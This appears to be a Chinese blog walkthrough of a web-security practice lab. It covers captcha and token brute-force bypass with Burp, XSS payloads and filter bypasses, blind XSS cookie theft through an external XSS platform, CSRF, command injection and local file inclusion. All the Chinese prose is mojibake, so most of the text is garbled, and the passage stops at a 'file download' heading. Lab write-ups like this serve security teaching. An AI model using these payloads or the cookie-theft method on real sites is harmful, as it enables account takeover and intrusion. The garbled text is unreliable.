<h3 id="éªŒè¯ç ç»•è¿‡-on-client"><a href="#éªŒè¯ç ç»•è¿‡-on-client" class="headerlink" title="éªŒè¯ç ç»•è¿‡(on client)"></a>éªŒè¯ç ç»•è¿‡(<code>on client</code>)</h3><p>å¡«å†™æ­£ç¡®çš„éªŒè¯ç ååŠ«æŒè¯·æ±‚åŒ…ï¼Œåœ¨<code>Repeater</code>æ¨¡å—ä¸­å°†éªŒè¯ç å‚æ•°è®¾ç½®ä¸ºç©ºåå‘é€ï¼ŒæœåŠ¡å™¨è¿”å›æ­£å¸¸ä¿¡æ¯ï¼Œ</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131758776.png" alt="image-20241011155625971" style="zoom:50%;" />

<p>ç„¶åå°†è¯·æ±‚åŒ…å‘é€åˆ°<code>Intruder</code>æ¨¡å—ï¼Œæ­£å¸¸æš´åŠ›ç ´è§£å³å¯ã€‚</p>
<h3 id="tokené˜²çˆ†ç ´"><a href="#tokené˜²çˆ†ç ´" class="headerlink" title="tokené˜²çˆ†ç ´"></a><code>token</code>é˜²çˆ†ç ´</h3><p>è¿™ç§æŠ“åŒ…åï¼Œå¯ä»¥å‘ç°å¤šäº†ä¸€ä¸ª<code>token</code>å‚æ•°ï¼Œéœ€è¦åŒæ—¶çˆ†ç ´ä¸¤ä¸ªå‚æ•°ï¼Œå¯ä»¥åˆ©ç”¨<code>Pitchfork</code>æ”»å‡»æ¨¡å¼ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131801378.png" alt="image-20241011160629228" style="zoom:50%;" />

<p><code>password</code>çš„<code>payload</code>è®¾ç½®æ­£å¸¸åŠ è½½å­—å…¸ï¼Œ<code>token</code>çš„<code>payload</code>è®¾ç½®ä¸º<code>Recursive grep</code>ï¼ˆé€’å½’æœç´¢ï¼‰ç±»å‹</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131758117.png" alt="image-20241011161617335" style="zoom: 67%;" />

<p>åœ¨<code>Options</code>æ¨¡å—ä¸‹ï¼š</p>
<p>åœ¨<code>Request Engine</code>ä¸­è®¾ç½®çº¿ç¨‹æ•°ä¸º<code>1</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131758854.png" alt="image-20241011161720097" style="zoom:67%;" />

<p>åœ¨<code>Grep-Extract</code>ä¸­æå–å“åº”ä¸­çš„æœ‰ç”¨ä¿¡æ¯ï¼Œåˆ°æ”»å‡»ç»“æœè¡¨ä¸­ï¼Œè¿™é‡Œæ˜¯<code>token</code>å€¼</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757965.png" alt="image-20241011161903701" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757206.png" alt="image-20241011162304789" style="zoom:50%;" />

<p>åœ¨<code>Redirections</code>ä¸­è®¾ç½®å¦‚ä½•éµå¾ªé‡å®šå‘ä¸º<code>Always</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757337.png" alt="image-20241011162347048" style="zoom:50%;" />

<p>ç„¶åå¼€å§‹çˆ†ç ´</p>
<h2 id="XSSè·¨ç«™è„šæœ¬"><a href="#XSSè·¨ç«™è„šæœ¬" class="headerlink" title="XSSè·¨ç«™è„šæœ¬"></a><code>XSS</code>è·¨ç«™è„šæœ¬</h2><h3 id="æ¼æ´æµ‹è¯•æµç¨‹"><a href="#æ¼æ´æµ‹è¯•æµç¨‹" class="headerlink" title="æ¼æ´æµ‹è¯•æµç¨‹"></a><strong>æ¼æ´æµ‹è¯•æµç¨‹</strong></h3><ol>
<li>åœ¨ç›®æ ‡ç«™ç‚¹æ‰¾åˆ°è¾“å…¥ç‚¹ï¼Œæ¯”å¦‚æŸ¥è¯¢æ¥å£ï¼Œç•™è¨€æ¿ç­‰ï¼›</li>
<li>è¾“å…¥ä¸€ç»„â€œç‰¹æ®Šå­—ç¬¦+å”¯ä¸€è¯†åˆ«å­—ç¬¦â€ï¼Œç‚¹å‡»æäº¤åï¼ŒæŸ¥çœ‹è¿”å›çš„æºç ï¼Œæ˜¯å¦æœ‰åšå¯¹åº”çš„å¤„ç†ã€‚</li>
<li>é€šè¿‡æœç´¢å®šä½åˆ°å”¯ä¸€å­—ç¬¦ï¼Œç»“åˆå”¯ä¸€å­—ç¬¦å‰åè¯­æ³•ç¡®è®¤æ˜¯å¦å¯ä»¥æ„é€ æ‰§è¡ŒJSä»£ç çš„æ¡ä»¶ï¼ˆæ„é€ é—­åˆï¼‰ï¼Œæ˜¯å¦åœ¨<code>p</code>æ ‡ç­¾ä¸­ï¼›</li>
<li>æäº¤payloadï¼ŒæˆåŠŸæ‰§è¡Œåˆ™å­˜åœ¨xssæ¼æ´ã€‚</li>
</ol>
<h3 id="åå°„å‹xss-get"><a href="#åå°„å‹xss-get" class="headerlink" title="åå°„å‹xss(get)"></a>åå°„å‹<code>xss(get)</code></h3><p>â€‹	å…ˆè¾“å…¥<code>&lt;script&gt;111</code>æäº¤ï¼Œç„¶åæŸ¥çœ‹æºç ï¼Œæœç´¢æ‰¾åˆ°è¾“å…¥çš„<code>&lt;script&gt;111</code>ï¼Œè”ç³»ä¸Šä¸‹æ–‡å¯ä»¥ç¡®å®šè¿™æ˜¯ä¸€ä¸ª<code>xss</code>æ¼æ´ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757469.png" alt="image-20241011191329652" style="zoom: 50%;" />

<p>è¯•ç€è¾“å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œå‘ç°è¾“å…¥å­—èŠ‚æ•°è¢«é™åˆ¶ã€‚<br><code>F12</code>æ‰¾åˆ°è®¾ç½®å­—æ•°çš„å‚æ•°<code>maxlength</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757274.png" alt="image-20241011192735750"></p>
<p>ä¿®æ”¹<code>maxlength</code>å€¼</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131802005.png" alt="image-20241011192958868" style="zoom:67%;" />

<p>å†æ¬¡æ³¨å…¥ä»£ç </p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757113.png" alt="image-20241011193044360" style="zoom: 50%;" />

<h5 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a><code>payload</code>ï¼š</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;svg/onload=<span class="title function_ invoke__">confirm</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_ invoke__">alert</span>(<span class="number">3</span>)&gt;</span><br></pre></td></tr></table></figure>

<p>åå°„å‹<code>xss(post)</code>ä¸<code>get</code>å‹çš„åŒºåˆ«æ˜¯ï¼Œ<code>get</code>ä¼šåœ¨<code>url</code>ä¸­æ˜¾ç¤ºæˆ‘ä»¬æ³¨å…¥çš„ä»£ç ï¼Œè¯¥ç±»ä¸ä¼šæ˜¾ç¤ºã€‚</p>
<h3 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹<code>xss</code></h3><p>â€‹	å­˜å‚¨å‹ä¸åå°„å‹çš„åŒºåˆ«åœ¨äºï¼Œå­˜å‚¨å‹ä¼šå°†æ¯æ¬¡è¾“å…¥çš„æ•°æ®éƒ½ä¿ç•™åœ¨æ•°æ®åº“ä¸­ï¼Œåä¸€æ¬¡è¾“å…¥çš„æ•°æ®ä¸ä¼šè¦†ç›–å‰ä¸€æ¬¡è¾“å…¥çš„æ•°æ®ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131802917.png" alt="image-20241011195802223" style="zoom:67%;" />

<h3 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a><code>DOM</code>å‹<code>xss</code></h3><p>â€‹	<code>DOM XSS</code>çš„<code>XSS</code>ä»£ç å¹¶ä¸éœ€è¦æœåŠ¡å™¨è§£æå“åº”çš„ç›´æ¥å‚ä¸ï¼Œè§¦å‘<code>XSS</code>é çš„å°±æ˜¯æµè§ˆå™¨ç«¯çš„<code>DOM</code>è§£æï¼Œå¯ä»¥è®¤ä¸ºå®Œå…¨æ˜¯å®¢æˆ·ç«¯çš„äº‹æƒ…ï¼Œæ— æ³•é€šè¿‡<code>WAF</code>é˜²æŠ¤ã€‚</p>
<p>â€‹	åˆ†æä¸€ä¸‹å‰ç«¯ç½‘é¡µä»£ç ï¼Œå¯ä»¥å‘ç°è¾“å…¥æ¡†é‡Œçš„å‚æ•°ä¼šè¢«ä¼ é€’ç»™<code>a</code>æ ‡ç­¾ä¸­çš„<code>href</code>å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥<code>payload</code>åç‚¹å‡»<code>a</code>æ ‡ç­¾ä¹Ÿå°±æ˜¯ç½‘é¡µä¸Šçš„<code>what do you see?</code>å³å¯ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757494.png" alt="image-20241011214756139" style="zoom: 67%;" />

<ul>
<li><p>è¾“å…¥<code>javascript:alert(1)</code>ï¼Œæ’å…¥æ•°æ®åçš„<code>a</code>æ ‡ç­¾ä¸ºï¼š<code>&lt;a href=&#39;javascript:alert(1)&#39;&gt;what do you see?&lt;/a&gt;</code>ã€‚</p>
</li>
<li><p>è¾“å…¥<code>&#39; onclick=&quot;alert(1)&quot;&gt;</code>ï¼Œè¾“å…¥çš„<code>&#39;</code>ä¼šæŠŠ<code>href</code>å±æ€§æ„é€ æˆä¸€ä¸ªé—­åˆï¼Œç„¶åå†é€šè¿‡<code>onclick</code>ä¹Ÿå¯ä»¥å®ç°è·Ÿä¸Šé¢ä¸€æ ·çš„åŠŸèƒ½ã€‚</p>
</li>
</ul>
<p>å‰ï¼š<code>&lt;a href=&#39;&#39;&gt;what do you see?&lt;/a&gt;</code><br>åï¼š<code>&lt;a href=&#39;&#39; onclick=&quot;alert(&#39;1&#39;)&quot;&gt;&#39;&gt;what do you see?&lt;/a&gt;</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757771.png" alt="image-20241011220439496" style="zoom:67%;" />

<h4 id="payloadï¼š-1"><a href="#payloadï¼š-1" class="headerlink" title="payloadï¼š"></a><code>payload</code>ï¼š</h4><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">javascript</span>:<span class="function"><span class="title">alert</span>(<span class="string">&quot;1&quot;</span>)</span></span><br><span class="line"><span class="string">&#x27; onclick=&quot;alert(&#x27;</span><span class="number">1</span><span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="xssä¹‹ç›²æ‰“"><a href="#xssä¹‹ç›²æ‰“" class="headerlink" title="xssä¹‹ç›²æ‰“"></a><code>xss</code>ä¹‹ç›²æ‰“</h3><blockquote>
<p>XSSç›²æ‰“ä¸æ˜¯ä¸€ç§æ¼æ´ç±»å‹è€Œæ˜¯ä¸€ç§xssæ¼æ´çš„åˆ©ç”¨æ–¹å¼ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç½‘ç«™ç•™è¨€æ¿ã€åé¦ˆå»ºè®®ç­‰åŠŸèƒ½ç‚¹æäº¤æ¶æ„çš„xss payloadï¼Œå¦‚æœè¯¥ç½‘ç«™å­˜åœ¨xssæ¼æ´ï¼Œå½“ç®¡ç†å‘˜åœ¨åå°æŸ¥çœ‹ç”¨æˆ·ç•™è¨€é¡µé¢æ—¶å°±ä¼šæ‰§è¡Œxss payloadï¼Œxssç›²æ‰“æœ€ä¸»è¦çš„ç›®çš„æ˜¯é€šè¿‡åŠ è½½å¤–éƒ¨çš„æ¶æ„jsæ–‡ä»¶(é€šè¿‡xssç›²æ‰“å¹³å°ç”Ÿæˆ)è·å–ç®¡ç†å‘˜åå°çš„Cookieä¿¡æ¯ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨ç®¡ç†å‘˜çš„èº«ä»½è®¿é—®ç½‘ç«™åå°ä»è€Œè¿›ä¸€æ­¥å‘åŠ¨æ”»å‡»</p>
</blockquote>
<p>è¯¥ç±»æ”»å‡»çš„è¿‡ç¨‹æ˜¯æ‰¾åˆ°<code>xss</code>æ¼æ´çš„æ³¨å…¥ç‚¹ï¼Œç„¶åå°†é€šè¿‡<a href="https://xssaq.com/dashboard">XSSå¹³å°</a>å¾—åˆ°çš„æ¶æ„<code>js</code>æ–‡ä»¶åœ¨æ¼æ´ç‚¹æ³¨å…¥ï¼Œç™»å½•ç®¡ç†å‘˜åå°ä½¿æ¶æ„ä»£ç æ‰§è¡Œï¼Œä¾¿èƒ½åœ¨<code>XSS</code>å¹³å°ä¸Šå¾—åˆ°<code>cookie</code>å€¼ã€‚</p>
<p>åœ¨<a href="https://xssaq.com/dashboard">XSSå¹³å°</a>ä¸Šï¼Œåˆ›å»ºé¡¹ç›®ï¼ŒæŸ¥çœ‹é…ç½®ä»£ç </p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757528.png" alt="image-20241012170823583" style="zoom:50%;" />

<p>å°†ç¬¬äºŒä¸ªä»£ç æ³¨å…¥æ¼æ´ç‚¹ï¼Œæäº¤</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131804716.png" alt="image-20241012170947388" style="zoom:50%;" />

<p>æ³¨å…¥æ¶æ„ä»£ç åï¼Œå†æ¬¡ç™»å½•åå°ï¼Œä»£ç å°±ä¼šè¢«æ‰§è¡Œ</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131805384.png" alt="image-20241012172214641" style="zoom:50%;" />

<p>ç„¶ååœ¨<code>XSS</code>å¹³å°ä¸ŠæŸ¥çœ‹è®°å½•ï¼Œè¦ç­‰ä¸€ä¼šå„¿æ‰èƒ½çœ‹åˆ°</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757491.png" alt="image-20241012172423588" style="zoom:50%;" />

<p>ç„¶åå°±å¯ä»¥åˆ©ç”¨è·å¾—çš„<code>cookie</code>å€¼ç™»å½•ç®¡ç†åå°äº†</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757454.png" alt="image-20241012172949880" style="zoom:50%;" />

<h3 id="xssä¹‹è¿‡æ»¤"><a href="#xssä¹‹è¿‡æ»¤" class="headerlink" title="xssä¹‹è¿‡æ»¤"></a><code>xss</code>ä¹‹è¿‡æ»¤</h3><p><code>&lt;&gt;</code>å¯ä»¥æ­£å¸¸æ‰“å°å‡ºæ¥</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757367.png" alt="image-20241012175326553"></p>
<p><code>&lt;script&gt;</code>è¢«è¿‡æ»¤</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131805565.png" alt="image-20241012175401883"></p>
<p>å°è¯•åŒå†™<code>&lt;scrscriptipt&gt;</code>åŒæ ·è¢«è¿‡æ»¤</p>
<p>å°è¯•å¤§å°å†™<code>&lt;ScrIpt&gt;</code>ï¼Œç»•è¿‡æˆåŠŸ</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757194.png" alt="image-20241012180032520"></p>
<p>çŒœæµ‹æ˜¯<code>script</code>å…³é”®å­—è¢«è¿‡æ»¤ï¼Œå°è¯•<code>&lt;svg/onload=confirm(1)&gt;</code>å’Œ<code>&lt;img src=1 onerror=alert(3)&gt;</code>éƒ½å¯æˆåŠŸ</p>
<h3 id="xssä¹‹htmlspecialchars"><a href="#xssä¹‹htmlspecialchars" class="headerlink" title="xssä¹‹htmlspecialchars"></a><code>xss</code>ä¹‹<code>htmlspecialchars</code></h3><h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a><code>htmlspecialchars</code></h4><p><code>htmlspecialchars</code>å‡½æ•°ä¼šæŠŠ<code>&#39; &quot; &amp; &lt; &gt;</code>ç­‰å­—ç¬¦è½¬æ¢ä¸ºå®ä½“ï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤äº†ã€‚ä½†æ˜¯è¯¥å‡½æ•°é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸ä¼šè¿‡æ»¤<code>&#39;</code>çš„ï¼Œåªæœ‰<code>quotestyle</code>é€‰é¡¹è¢«è®¾ä¸º<code>ENT_QUOTES</code>æ—¶æ‰ä¼šè¿‡æ»¤<code>&#39;</code>ã€‚</p>
<h4 id="æ ‡ç­¾å’Œhrefå±æ€§"><a href="#æ ‡ç­¾å’Œhrefå±æ€§" class="headerlink" title="&lt;a&gt;æ ‡ç­¾å’Œhrefå±æ€§"></a><code>&lt;a&gt;</code>æ ‡ç­¾å’Œ<code>href</code>å±æ€§</h4><p> <code>&lt;a&gt;</code>æ˜¯<code>&quot;anchor&quot;</code>çš„ç¼©å†™ï¼Œç”¨äºå®šä¹‰è¶…é“¾æ¥ï¼Œå¯ä»¥å°†ç”¨æˆ·å¯¼èˆªåˆ°å¦ä¸€ä¸ªé¡µé¢ã€é¡µé¢ä¸Šçš„æŸä¸ªéƒ¨åˆ†ï¼Œæˆ–è€…ä»»ä½•å…¶ä»–<code>URL</code>ã€‚<code>href</code>å±æ€§æŒ‡å®šäº†è¶…é“¾æ¥çš„ç›®æ ‡<code>URL</code>ã€‚</p>
<p>éšä¾¿è¾“å…¥123ï¼Œå‘ç°è¾“å…¥çš„æ•°æ®ç»™äº†<code>href</code>å±æ€§</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757581.png" alt="image-20241012184854479" style="zoom: 67%;" />

<p>é‚£å°±å…ˆè¾“å…¥<code>javascript:alert(1)</code>è¯•è¯•ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤ï¼Œå³å¯æˆåŠŸ</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131805160.png" alt="image-20241012185644279" style="zoom:50%;" />

<p>æˆåŠŸäº†ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨å…¶ä»–<code>payload</code>ï¼Œåªè¦èƒ½ç»•è¿‡è¿‡æ»¤å³å¯</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a><code>payload</code></h4><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">javascript</span>:<span class="function"><span class="title">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span></span><br><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="function"><span class="title">alert</span>(<span class="number">2</span>)<span class="string">&#x27;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="xssä¹‹hrefè¾“å‡º"><a href="#xssä¹‹hrefè¾“å‡º" class="headerlink" title="xssä¹‹hrefè¾“å‡º"></a><code>xss</code>ä¹‹<code>href</code>è¾“å‡º</h3><p>ç›´æ¥ç”¨<code>javascript:alert(1)</code>å³å¯ã€‚</p>
<h3 id="xssä¹‹jsè¾“å‡º"><a href="#xssä¹‹jsè¾“å‡º" class="headerlink" title="xssä¹‹jsè¾“å‡º"></a><code>xss</code>ä¹‹<code>js</code>è¾“å‡º</h3><p>è¾“å…¥123</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757943.png" alt="image-20241012190623893" style="zoom:50%;" />

<p>è¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>&#39;</code>å’Œ<code>//</code>æ„é€ åœ¨<code>$ms=&#39;123&#39;</code>å¯ä»¥æ‰§è¡Œçš„è¯­å¥ã€‚</p>
<p>è¾“å…¥<code>123&#39;;//</code>ï¼Œæ‹¼æ¥åï¼š<code>$ms=&#39;123&#39;;//&#39;;</code></p>
<p>æ‰€ä»¥ç°åœ¨æˆ‘ä»¬è¾“å…¥<code>123&#39;;alert(2);//</code>å³å¯</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757000.png" alt="image-20241012191615734"></p>
<h2 id="CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ "><a href="#CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ " class="headerlink" title="CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ "></a><code>CSRF</code>è·¨ç«™è¯·æ±‚ä¼ªé€ </h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a><code>CSRF(get)</code></h3><p>æ”»å‡»æ–¹ï¼š<code>vince</code><br>è¢«æ”»å‡»æ–¹ï¼š<code>allen</code><br>è¢«æ”»å‡»æ–¹åŸä¸ªäººä¿¡æ¯ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757895.png" alt="image-20241022141942627" style="zoom:50%;" />

<h4 id="æ”»å‡»æ–¹"><a href="#æ”»å‡»æ–¹" class="headerlink" title="æ”»å‡»æ–¹"></a>æ”»å‡»æ–¹</h4><p>æ”»å‡»æ–¹ç™»å½•è‡ªå·±è´¦å·ï¼Œç‚¹å‡»ä¿®æ”¹ä¸ªäººä¿¡æ¯</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131806543.png" alt="image-20241022142028237" style="zoom:50%;" />

<p>å¡«å…¥è¦ä¿®æ”¹çš„å†…å®¹ï¼Œç‚¹å‡»<code>submit</code>å¹¶è¿›è¡Œ<code>bp</code>æŠ“åŒ…</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757423.png" alt="image-20241022142718284" style="zoom:50%;" />

<p>å¯ä»¥å‘ç°ï¼Œè¯¥é¡µé¢æ˜¯é€šè¿‡<code>GET</code>ä¼ å‚æ–¹å¼å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹çš„</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757399.png" alt="image-20241022142845195"></p>
<p>å³é”®é€‰ä¸­<code>Engagement tools-&gt;Generate CSRF PoC</code>ï¼Œç”Ÿæˆ<code>CSRF Poc</code>ä»£ç </p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757604.png" alt="image-20241022143336617" style="zoom:50%;" />

<p>ç‚¹å‡»<code>Test in browser</code>ï¼Œå¤åˆ¶<code>URL</code>ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756736.png" alt="image-20241022143504559" style="zoom: 67%;" />

<p>å°†å½“å‰è¯·æ±‚åŒ…<code>Drop</code>æ‰ï¼Œå…³é—­<code>bp</code>æ‹¦æˆªï¼Œç›´æ¥é€€å‡ºç™»å½•ï¼Œ<code>vince</code>ä¿¡æ¯å¹¶æœªè¢«ä¿®æ”¹</p>
<h4 id="è¢«æ”»å‡»æ–¹"><a href="#è¢«æ”»å‡»æ–¹" class="headerlink" title="è¢«æ”»å‡»æ–¹"></a>è¢«æ”»å‡»æ–¹</h4><p>è¢«æ”»å‡»æ–¹<code>allen</code>ç™»å½•è‡ªå·±è´¦å·ï¼Œç„¶åæ¥åˆ°å‰é¢<code>burp</code>ç”Ÿæˆçš„ç½‘ç«™ï¼Œç‚¹å‡»<code>Submit request</code>ï¼Œæ­¤æ—¶è¢«æ”»å‡»æ–¹çš„ä¸ªäººä¿¡æ¯å·²è¢«æˆåŠŸä¿®æ”¹</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756730.png" alt="image-20241022144414264" style="zoom:50%;" />

<h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a><code>CSRF(post)</code></h3><p>è¯¥ç±»ä¸å‰ç±»çš„åŒºåˆ«åœ¨äºï¼Œå¯¹äºå…³é”®æ•°æ®çš„ä¼ å‚æ–¹å¼ä¸åŒï¼Œæ”»å‡»è¿‡ç¨‹åŒä¸Š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131807839.png" alt="image-20241022144910205" style="zoom:50%;" />

<p>æ”»å‡»æˆåŠŸï¼Œè¿‡ç¨‹ä¸å†èµ˜è¿°</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756346.png" alt="image-20241022145016235" style="zoom:50%;" />

<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><code>RCE</code></h2><h3 id="exec-ping"><a href="#exec-ping" class="headerlink" title="exec&quot;ping&quot;"></a><code>exec&quot;ping&quot;</code></h3><p>é€šè¿‡ä¸€äº›å‘½ä»¤è¿æ¥ç¬¦å¦‚<code>||,&amp;,&amp;&amp;</code>ï¼Œæ¥æ‹¼æ¥<code>IP</code>åœ°å€å’Œå‘½ä»¤ï¼Œæ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p>
<h3 id="exec-eval"><a href="#exec-eval" class="headerlink" title="exec&quot;eval&quot;"></a><code>exec&quot;eval&quot;</code></h3><p>è¿™ç§æ˜¯ç›´æ¥é€šè¿‡<code>eval()</code>å°†è¾“å…¥çš„å­—ç¬¦ä¸²å½“ä½œä»£ç æ¥æ‰§è¡Œã€‚</p>
<h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š<code>include(),include_once(),require(),require_once()</code></p>
<h3 id="é˜²èŒƒæªæ–½"><a href="#é˜²èŒƒæªæ–½" class="headerlink" title="é˜²èŒƒæªæ–½"></a><strong>é˜²èŒƒæªæ–½</strong></h3><ul>
<li>åœ¨åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦å°†æ–‡ä»¶åŒ…å«å‡½æ•°å¯¹åº”çš„æ–‡ä»¶æ”¾ç»™å‰ç«¯è¿›è¡Œé€‰æ‹©å’Œæ“ä½œã€‚</li>
<li>è¿‡æ»¤å„ç§<code>./.</code>ï¼Œ<code>http://</code>ï¼Œ<code>https://</code></li>
<li>é…ç½®php.inié…ç½®æ–‡ä»¶ï¼š<code>allow_ url_open = off</code>ï¼Œ<code>Allow_ url include= off</code>ï¼Œ<code>magic quotes_ gpc=on</code> <code> //gpc</code>åœ¨</li>
<li>é€šè¿‡ç™½åå•ç­–ç•¥ï¼Œä»…å…è®¸åŒ…å«è¿è¡ŒæŒ‡å®šçš„æ–‡ä»¶ï¼Œå…¶ä»–çš„éƒ½ç¦æ­¢ã€‚</li>
</ul>
<h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><p>â€‹	è¿™ç§æ˜¯ä»…å¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œå› ä¸ºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå·±æ§åˆ¶çš„ï¼Œæ‰€ä»¥è¯¥ç§æ”»å‡»é€šå¸¸æ˜¯åŒ…å«ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶ï¼ˆå¦‚å¯†é’¥æ–‡ä»¶ï¼‰ï¼Œæˆ–æ˜¯é…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´å»åˆ©ç”¨ã€‚</p>
<p>â€‹	å…ˆéšä¾¿æäº¤ä¸€ä¸ªæ•°æ®ï¼Œç„¶åçœ‹<code>url</code>å¯ä»¥å‘ç°ï¼Œ<code>filename=</code>è¿™ä¸ªå‚æ•°å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‚æ•°è®¿é—®æœ¬åœ°ä¸Šçš„å…¶ä»–æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756056.png" alt="image-20241013160223589"></p>
<p>â€‹	åœ¨æœ¬åœ°æŸ¥çœ‹å½“å‰ç›®å½•ï¼Œå…¶ä¸‹æœ‰ä¸€ä¸ª<code>file6.php</code>æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹é‡Œé¢çš„å†…å®¹ï¼Œè¯¥é¶åœºåº”è¯¥æ˜¯å°†è¯¥æ–‡ä»¶ä½œä¸ºä¸€ä¸ªæ•æ„Ÿæ–‡ä»¶</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756713.png" alt="image-20241013160634171" style="zoom:50%;" />

<p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡è®¾ç½®<code>url</code>ä¸­çš„<code>filename=file6.php</code>æ¥è·å–<code>file6.php</code>æ–‡ä»¶é‡Œçš„æ•æ„Ÿæ•°æ®</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756722.png" alt="image-20241013161053618" style="zoom:50%;" />

<h2 id="æ–‡ä»¶ä¸‹è½½"><a href="#æ–‡ä»¶ä¸‹è½½" class="headerlink" title="æ–‡ä»¶ä¸‹è½½"></a>æ–‡ä»¶ä¸‹è½½</h2><p><strong>åŸç†ï¼š</strong></p>
